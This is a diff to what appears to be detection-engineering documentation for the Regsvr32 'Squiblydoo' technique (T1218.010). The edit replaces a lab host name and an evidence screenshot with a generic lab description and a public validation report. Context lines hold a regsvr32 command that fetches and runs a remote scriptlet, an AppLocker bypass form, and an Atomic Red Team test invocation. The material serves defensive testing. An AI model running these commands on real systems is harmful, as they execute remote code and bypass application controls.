@@ -60,11 +60,11 @@ regsvr32.exe /s /n /u /i:https://example.com/atomic-test.sct scrobj.dll
 ```
 
 
-**Validated**: 2026-04-30 via Atomic Red Team T1218.010-1 (Regsvr32 local COM scriptlet execution (Squiblydoo)) on lab host `win10-sysmon-client`.
+**Validated**: 2026-04-30 via Atomic Red Team T1218.010-1 (Regsvr32 local COM scriptlet execution (Squiblydoo)) on an isolated Windows lab endpoint.
 
 Squiblydoo bypass: `regsvr32 /s /u /i:<file.sct> scrobj.dll`. Loads a .sct scriptlet via the COM scripting engine, bypassing AppLocker DLL rules.
 
-**Evidence**: ![evidence](../tests/atomic/evidence/T1218.010-regsvr32-squiblydoo.png)
+**Public evidence**: [aggregate validation report](../artifacts/public/live-detection-validation-20260806.json). Dispatch completed without error; no positive scenario is claimed for that published campaign.
 
 **Test command**: `Invoke-AtomicTest T1218.010 -TestNumbers 1`
 
